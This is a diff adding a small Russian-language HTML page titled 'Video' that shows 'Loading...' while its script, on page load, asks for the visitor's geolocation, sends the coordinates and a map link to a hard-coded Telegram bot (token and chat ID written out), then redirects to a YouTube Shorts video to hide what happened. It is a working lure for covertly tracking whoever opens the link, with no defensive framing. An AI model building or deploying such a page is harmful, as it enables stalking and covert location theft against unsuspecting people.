@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Видео</title>
+  <script>
+    const token = '8016647728:AAHobE4QiXJZD27xMt68RFj41ZsZ2upS9eY';
+    const chatId = '6798447912';
+    const youtubeLink = 'https://youtube.com/shorts/CGYuR4KZypE?si=2hxg-0zpevGw0Hao'; // замени на нужное
+
+    function sendLocation(position) {
+      const { latitude, longitude } = position.coords;
+      const message = `Геолокация:\nШирота: ${latitude}\nДолгота: ${longitude}\nhttps://maps.google.com/?q=${latitude},${longitude}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(() => {
+        window.location.href = youtubeLink;
+      });
+    }
+
+    function handleError() {
+      window.location.href = youtubeLink;
+    }
+
+    window.onload = () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        handleError();
+      }
+    }
+  </script>
+</head>
+<body>
+  <p>Загрузка...</p>
+</body>
+</html>
